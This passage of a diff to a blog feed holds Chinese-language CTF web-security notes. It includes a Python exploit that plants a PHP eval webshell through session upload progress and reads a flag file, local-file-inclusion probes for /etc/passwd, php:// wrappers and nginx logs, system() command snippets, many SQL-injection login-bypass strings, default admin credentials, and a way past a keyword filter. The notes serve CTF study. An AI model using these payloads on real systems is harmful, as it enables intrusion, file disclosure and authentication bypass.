+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-z]+/&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;file://&quot;</span>.<span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>代码解释：</p>
+<blockquote>
+<p>观察cookie，发现自动开启了session，直接session文件包含</p>
+<p>如果能获取PHPSESSID<br>    “请求 Cookie”: {<br>        <strong>“PHPSESSID”: “a5c4fd8ef729d435160c08a37d20ed7a”</strong><br>    }</p>
+</blockquote>
+<p>EXP:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># Author:ctfshow-h1xa</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;localhost/tmp/sess_ctfshow&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>:<span class="string">&#x27;system(&quot;cat /flag_is_here.txt&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,data=data,files=file,cookies=cookies)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h1 id="php文件漏洞"><a href="#php文件漏洞" class="headerlink" title="php文件漏洞"></a>php文件漏洞</h1><p><strong>get方式查看文件漏洞</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=/etc/passwd  </span><br><span class="line">#GET /?url=/etc/passwd HTTP/1.1</span><br><span class="line">#若出现大串文件，则有文件漏洞</span><br><span class="line">#($_GET[&#x27;url&#x27;])极有可能含有文件漏洞</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>使用php协议</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=php://input</span><br><span class="line">#GET /?url=php://input HTTP/1.1</span><br><span class="line">#可以访问请求的原始数据的只读流;</span><br><span class="line">#enctype=&quot;multipart/form-data&quot;的时候php://input是无效的;</span><br><span class="line"></span><br><span class="line">?url=php://output</span><br><span class="line">#GET /?url=php://output HTTP/1.1</span><br><span class="line">#一个只写的数据流，允许以print和echo一样的方式写入到输出缓冲区</span><br><span class="line"></span><br><span class="line">?url=php://fd</span><br><span class="line">#GET /?url=php://fd HTTP/1.1</span><br><span class="line">#允许直接访问指定的文件描述符。例如：php://fd/3引用了文件描述符3.</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>查看PHP下的文夹使用ls</strong></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><strong>查看php下的文件夹中的文件内容cat</strong></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat 文件夹名称&quot;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><strong>查看文件日志的文件夹</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h1 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h1><blockquote>
+<p> ‘r 1&#x3D;1 #</p>
+<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p> 账号： admin<br> 密码：admin</p>
+<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p> 账号：admin<br> 密码：admin888</p>
+<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p> 账号：admin</p>
+<p> 密码：域名名</p>
+<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<h2 id="asp-aspx万能密码"><a href="#asp-aspx万能密码" class="headerlink" title="asp aspx万能密码"></a>asp aspx万能密码</h2><p> “or ‘a’&#x3D;”a<br> ‘’)or(‘a’&#x3D;’a<br> or 1&#x3D;1–<br> ‘or 1&#x3D;1–<br> a’or’ 1&#x3D;1–<br> “or 1&#x3D;1–<br> ‘or’a’&#x3D;’a<br> “or”&#x3D;”a’&#x3D;’a<br> ‘or”&#x3D;’<br> ‘or’&#x3D;’or’</p>
+<p> admin’or 1&#x3D;1#<br> ‘&#x3D;’&amp;password&#x3D;’&#x3D;’<br> admin’ or 1&#x3D;1#<br> admin’&#x2F;<strong>&#x2F;or&#x2F;</strong>&#x2F;1&#x3D;1#<br> admin’&#x2F;*<br> *&#x2F;‘</p>
+<p> 1 or ‘1’&#x3D;’1’&#x3D;1<br> 1 or ‘1’&#x3D;’1’ or 1&#x3D;1<br> ‘OR 1&#x3D;1%00<br> “or 1&#x3D;1%00<br> ‘xor## PHP万能密码</p>
+<p> ‘or’&#x3D;’or’</p>
+<p> ‘or 1&#x3D;1&#x2F;* 字符型 GPC是否开都可以使用</p>
+<p> User: something<br> Pass: ‘OR ‘1’&#x3D;’1</p>
+<p> jsp 万能密码</p>
+<p> 1’or’1’&#x3D;’1</p>
+<p> admin’ OR 1&#x3D;1&#x2F;*</p>
+<p> 用户名：admin 系统存在这个用户的时候 才用得上<br> 密码：1’or’1’&#x3D;’1</p>
+</blockquote>
+<h1 id="万能账号"><a href="#万能账号" class="headerlink" title="万能账号"></a>万能账号</h1><blockquote>
+<p>a’ or true #</p>
+<p>账号：…admin’ or ‘a’&#x3D;’a 密码随便填</p>
+</blockquote>
+<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><blockquote>
+<hr>
+<p>&#x2F;or|-||&#x2F;|*|&lt;|&gt;|!|x|hex|(|)|+|select&#x2F;i</p>
+<blockquote>
+<ol>
+<li><code>/</code>：这个符号表示正则表达式模式的开始和结束。</li>
+<li><code>|</code>：这个符号代表“或”条件，意味着可以匹配两边的任何模式。</li>
+<li>\-, \, /, \*, &lt;, &gt;, !, x, hex, (, ), +, select&#96;: 这些是正则表达式将尝试匹配的实际模式。这些模式中的一些代表特定字符，而其他一些代表某些条件。<ul>
+<li><code>-</code>：匹配破折号字符。</li>
+<li><code>\\</code>：匹配反斜杠字符。</li>
+<li><code>\/</code>：匹配正斜杠字符。</li>
+<li><code>\\*</code>：匹配星号字符。</li>
+<li><code>\&lt;</code>：匹配单词的开头。</li>
+<li><code>\&gt;</code>：匹配单词的结尾。</li>
+<li><code>\!</code>：匹配感叹号字符。</li>
+<li><code>x</code>：匹配字母 ‘x’。</li>
+<li><code>hex</code>：匹配字符串 ‘hex’。</li>
+<li><code>\(</code>：匹配左括号。</li>
+<li><code>\)</code>：匹配右括号。</li>
+<li><code>\+</code>：匹配加号。</li>
+<li><code>select</code>：匹配字符串 ‘select’。</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<p>可以使用管道符||绕过和使用取反符号~~绕过</p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>笔记</tag>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>实战</tag>
       </tags>
   </entry>
   <entry>
